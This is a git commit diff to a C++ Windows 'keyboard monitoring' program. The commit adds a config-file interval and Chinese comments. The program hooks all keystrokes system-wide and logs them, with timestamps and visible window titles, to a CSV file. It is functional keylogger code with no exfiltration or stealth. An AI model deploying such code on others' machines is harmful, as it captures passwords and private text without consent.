3be34685cc99bb866b60670a4ac283860f93ce48
YX <149877139+Xpercent-YX@users.noreply.github.com>
2024-01-27 22:27:04 +0800

    Add files via upload

--- Keyboard monitoring/Get_keyboard_input.cpp
+++ Keyboard monitoring/Get_keyboard_input.cpp
@@ -9,20 +9,32 @@
 #include <vector>
 #include <algorithm>
 #include <thread>
-const char* windowsToFilter[] = { "设置", "邮件" ,"Program Manager","Microsoft Store","Windows 输入体验" ,"MSN" ,"收件箱 - Outlook ?- 邮件"};
+#include "INIFileParser.h"
+const char* windowsToFilter[] = { "设置", "邮件" ,"Program Manager","Microsoft Store","Windows 输入体验" ,"MSN" ,"收件箱 - Outlook ?- 邮件" };
 const int numWindowsToFilter = sizeof(windowsToFilter) / sizeof(windowsToFilter[0]);
 
 bool timerPaused = false;
-std::string windowTitles; // String to store window titles
-std::vector<std::string> windowTitlesList;
-std::string keyinput;
-std::string timeString;
+std::string windowTitles; // 用于存储窗口标题的字符串
+std::vector<std::string> windowTitlesList; // 存储窗口标题的向量
+std::string keyinput; // 存储按键输入的字符串
+std::string timeString; // 存储时间字符串
+int timeValue = 20;
 
+void iniread() {
+    INIFileParser parser("config.ini");
+
+    std::string value = parser.getValue("Section1", "time");
+    timeValue = std::stoi(value);
+
+}
+
+// 枚举窗口回调函数
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     char windowTitle[256];
     GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
+
     if (IsWindowVisible(hwnd) && strlen(windowTitle) > 0) {
-        // Check if the window title matches any in the filter list
+        // 检查窗口标题是否与过滤列表中的任何标题匹配
         bool shouldFilter = false;
         for (int i = 0; i < numWindowsToFilter; ++i) {
             if (strcmp(windowTitle, windowsToFilter[i]) == 0) {
@@ -30,7 +42,8 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
                 break;
             }
         }
-        // If the window title does not match any in the filter list, add it to the result string
+
+        // 如果窗口标题不匹配过滤列表中的任何标题，则将其添加到结果字符串中
         if (!shouldFilter) {
             windowTitlesList.push_back(windowTitle);
         }
@@ -38,50 +51,47 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
+// 键盘钩子回调函数
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
         keyinput += GetKeyName(pkbhs->vkCode);
-        //std::cout << keyinput << std::endl;
     }
     // 调用下一个钩子
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
+
+// 将窗口标题向量转换为字符串
 void TitlesString() {
-
     std::sort(windowTitlesList.begin(), windowTitlesList.end());
-    // 使用 unique 函数删除相邻的重复元素
     auto it = std::unique(windowTitlesList.begin(), windowTitlesList.end());
-    // 删除重复元素后的 vector 大小
     windowTitlesList.resize(std::distance(windowTitlesList.begin(), it));
-
 
     for (size_t i = 0; i < windowTitlesList.size(); ++i) {
         windowTitles += windowTitlesList[i];
-        // 在除最后一个元素之外的所有元素后面插入分隔符
         if (i < windowTitlesList.size() - 1) {
             windowTitles += "|";
         }
     }
+    // 删除逗号
     size_t found = windowTitles.find(",");
     if (found != std::string::npos) {
-        // 如果包含逗号，则删除所有逗号
         windowTitles.erase(std::remove(windowTitles.begin(), windowTitles.end(), ','), windowTitles.end());
     }
-    
 }
 
-
+// 获取当前时间的字符串表示
 void gettime() {
     auto currentTime = std::chrono::system_clock::now();
     std::time_t currentTimeT = std::chrono::system_clock::to_time_t(currentTime);
     std::tm localTime;
     localtime_s(&localTime, &currentTimeT);
-    std::ostringstream oss;  // 使用ostringstream构建字符串
+    std::ostringstream oss;
     oss << std::put_time(&localTime, "%Y|%m|%d|%H|%M|%S");
-    timeString = oss.str();  // 从ostringstream中获取字符串
+    timeString = oss.str();
 }
 
+// 将数据写入文件
 void writefile(std::string timeString) {
     TitlesString();
     std::string writeletter = timeString + "," + windowTitles + "," + keyinput;
@@ -90,7 +100,6 @@ void writefile(std::string timeString) {
     csvFile << writeletter << std::endl;
     csvFile.close();
 
-    timerPaused = true;
     gettime();
     windowTitles = "";
     windowTitlesList.clear();
@@ -98,20 +107,24 @@ void writefile(std::string timeString) {
     timerPaused = false;
 }
 
+// 检查按键输入字符串长度的线程函数
 void checkStringLength() {
     while (true) {
         auto start_time = std::chrono::steady_clock::now();
         size_t current_length = keyinput.length();
-        std::this_thread::sleep_for(std::chrono::seconds(10));
+        std::this_thread::sleep_for(std::chrono::seconds(timeValue));
         auto end_time = std::chrono::steady_clock::now();
         auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
+
         // 检查字符串长度是否在10秒内没有变化
-        if (keyinput.length() == current_length && elapsed_time >= 5 && keyinput != "") {
+        if (keyinput.length() == current_length && elapsed_time >= timeValue-1 && keyinput != "") {
+            timerPaused = true;
             writefile(timeString);
         }
     }
 }
 
+// 定时器回调函数，用于枚举窗口
 void CALLBACK TimerProc2(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
     if (!timerPaused) {
         EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), EnumWindowsProc, 0);
@@ -119,12 +132,14 @@ void CALLBACK TimerProc2(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
 }
 
 int main() {
+    iniread();
     gettime();
     std::thread lengthChecker(checkStringLength);
-
     SetTimer(NULL, 1, 2000, TimerProc2);
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     MSG msg;
+
+    // 消息循环
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
@@ -132,6 +147,3 @@ int main() {
 
     return 0;
 }
-
-
-
